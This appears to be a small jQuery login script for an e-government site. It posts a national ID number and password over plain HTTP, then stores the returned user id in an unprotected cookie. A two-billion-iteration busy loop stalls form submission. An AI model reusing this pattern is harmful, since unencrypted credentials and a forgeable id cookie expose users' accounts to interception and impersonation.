$(document).ready(function () {
	$('#loginForm').submit(function(e) {
		var nik = $('#nik').val();
			var password = $('#password').val()
				$.ajax({
			        url: 'http://e-gov-bandung.tk/dukcapil/api/public/auth/login',
			        type: 'POST',
			        data: { nik: nik, password : password} ,
			        success: function (response) {
			        	document.cookie="activeID=" + response.id + "; path=/";
			        	window.location.href = "http://e-gov-bandung.tk/aparter/public/home";
			        },
			        error: function (err) {
			        }
			    });
		for (var i = 0; i < 2000000000; ++i);
	});
});